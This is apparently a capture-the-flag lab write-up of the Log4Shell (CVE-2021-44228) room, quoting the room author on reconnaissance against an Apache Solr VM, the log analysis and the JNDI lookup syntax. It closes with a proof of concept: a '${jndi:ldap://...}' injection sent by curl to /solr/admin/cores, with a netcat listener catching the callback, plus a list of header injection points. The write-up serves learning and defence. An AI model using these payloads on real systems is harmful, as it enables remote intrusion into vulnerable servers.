# Intro

From JohnHammond:

*On December 9th, 2021, the world was made aware of a new vulnerability identified as CVE-2021-44228, affecting the Java logging package log4j. This vulnerability earned a severity score of 10.0 (the most critical designation) and offers remote code trivial remote code execution on hosts engaging with software that utilizes this log4j version. This attack has been dubbed "Log4Shell"*

*Today, log4j version 2.15.0rc2 is available and patches this vulnerability. However, the sheer danger of this vulnerability is due to how ubiquitous the logging package is. Millions of applications as well as software providers use this package as a dependency in their own code. While you may be able to patch your own codebase using log4j, other vendors and manufacturers will still need to push their own security updates downstream. Many security researchers have likened this vulnerability to that of Shellshock by the nature of its enormous attack surface. We will see this vulnerability for years to come.*

For a growing community-supported list of software and services vulnerable to CVE-2021-44228, check out this GitHub repository:

   [https://github.com/YfryTchsGD/Log4jAttackSurface]

This room will showcase how you can test for, exploit, and mitigate this vulnerability within Log4j.

While there are a number of other articles, blogs, resources and learning material surrounding CVE-2021-44228, I (the author of this exercise) am particularly partial to these:

Note from the author:

*Please use the information you learn in this room to better the security landscape. Test systems you own, apply patches and mitigations where appropriate, and help the whole industry recover. This is a very current and real-world threat -- whether you are a penetration tester, red teamer, incident responder, security analyst, blue team member, or what have you -- this exercise is to help you and the world understand and gain awareness on this widespread vulnerability. It should not be used for exploitative gain or self-serving financial incentive (I'm looking at you, beg bounty hunters)*

Additionally, please bear in mind that the developers of the log4j package work on the open source project as a labor of love and passion. They are volunteer developers that maintain their project in their spare time. There should be absolutely no bashing, shame, or malice towards those individuals. As with all things, please further your knowledge so you can be a pedestal and pillar for the information security community. Educate, share, and help.*

# Reconnaissance

The target VM has software that incorperates the log4j package that is vulnerable to log4shell. Like most THM rooms this one has us log into the VPN and then start up the VM. Though we are prompted on how to port scan the VM, and I know that it is running services on uncommon ports as the first question is "What service is running on port 8983?"

```
nmap -sV -p 8983 10.10.186.122
```
```
Nmap scan report for 10.10.186.122
Host is up (0.20s latency).

PORT     STATE SERVICE VERSION
8983/tcp open  http    Apache Solr
```

# Discovery

From John:

*This target machine is running Apache Solr 8.11.0, one example of software that is known to include this vulnerable log4j package. For the sake of showcasing this vulnerability, the application runs on Java 1.8.0_181.

Explore the web interface accessible at http://10.10.186.122:8983 and click around to get a feel for the application. For more detail on Apache Solr, please refer to their official website. https://solr.apache.org/

This instance of Apache Solr is provisioned with no data whatsoever. It is a flat, vanilla, and absolutely minimum installation -- yet at its core it is still vulnerable to this CVE-2021-44228. *

We are also given a set of log files to view:

```bash   
solr-8983-console.log  solr.log    solr.log.2    solr_slow_requests.log
solr_gc.log.0.current  solr.log.1  solrlogs.zip

```

## Questions

1. *Take a close look at the first page visible when navigating to http://10.10.9.61:8983. You should be able to see clear indicators that log4j is in use within the application for logging activity. What is the -Dsolr.log.dir argument set to, displayed on the front page?*

2. *Download the attached files (accessible in the top-right of this task) see some example log files within Solr. Explore each file, if just to get a feel for what is displayed in what log. *

*One file has a significant number of INFO entries showing repeated requests to one specific URL endpoint. Which file includes contains this repeated entry? (Just the filename itself, no path needed)*


using `vimdiff` on the log files I can see that solr.log has the entries and lets me answer the following questions.

3. *What "path" or URL endpoint is indicated in these repeated entries?*
4. *Viewing these log entries, what field name indicates some data entrypoint that you as a user could control? (Just the field name)*

# PoC

## Bacground from John
Note that the URL endpoint that you have just uncovered needs to be prefaced with the solr/ prefix when viewing it from the web interface. This means that you should visit:

http://10.10.9.61:8983/solr/admin/cores

You also noticed that params seems to be included in the log file. At this point, you may already be beginning to see the attack vector.

The log4j package adds extra logic to logs by "parsing" entries, ultimately to enrich the data -- but may additionally take actions and even evaluate code based off the entry data. This is the gist of CVE-2021-44228. Other syntax might be in fact executed just as it is entered into log files. 

Some examples of this syntax are:

    ${sys:os.name}
    ${sys:user.name}
    ${log4j:configParentLocation}
    ${ENV:PATH}
    ${ENV:HOSTNAME}
    ${java:version}
You may already know the general payload to abuse this log4j vulnerability. The format of the usual syntax that takes advantage of this looks like so:

${jndi:ldap://ATTACKERCONTROLLEDHOST}

This syntax indicates that the log4j will invoke functionality from "JNDI", or the "Java Naming and Directory Interface." Ultimately, this can be used to access external resources, or "references," which is what is weaponized in this attack. 

Notice the ldap:// schema. This indicates that the target will reach out to an endpoint (an attacker controlled location, in the case of this attack) via the LDAP protocol. For the sake of brevity, we will not need to cover all the ins-and-outs and details of LDAP here, but know that this is something we will need to work with as we refine our attack.

For now, know that the target will in fact make a connection to an external location. This is indicated by the ATTACKERCONTROLLEDHOST placeholder in the above syntax. You, acting as the attacker in this scenario, can host a simple listener to view this connection.

The next question is, where could we enter this syntax?

Anywhere that has data logged by the application.

This is the crux of this vulnerability. Unfortunately, it is very hard to determine where the attack surface is for different applications, and ergo, what applications are in fact vulnerable. Simply seeing the presence of log4j files doesn't clue in on the exact version number, or even where or how the application might use the package.

Think back to the previous task. You already discovered that you could supply params to the /solr/admin/cores URL, and now that you have a better understanding of how log4j works, you should understand that this is where you supply your inject syntax. You can simply supply HTTP GET variables or parameters which will then processed and parsed by log4j. All it takes is this single line of text -- and that makes this vulnerability extremely easy to exploit.

Other locations you might supply this JNDI syntax:

    Input boxes, user and password login forms, data entry points within applications
    HTTP headers such as User-Agent, X-Forwarded-For, or other customizable headers
    Any place for user-supplied data

If you would like more information on this JNDI attack vector, please review this Black Hat USA presentation from 2016.

## My Poc

To craft my Poc I am going to need the following things:

1. The URL for our JNDI payload `http://10.10.9.61:8983/solr/admin/cores?foo=`
2. Our JNDI payload including our ip and desired listening port `$\{jndi:ldap://10.6.77.38:9999\}`
3. And to start a netcat listener on desired port `nc -lvnp 9999`

With my netcat running I can use curl to send my full injection and payload wrapped in single quotes.

`curl 'http://10.10.9.61:8983/solr/admin/cores?foo=$\{jndi:ldap://10.6.77.38:9999\}'`
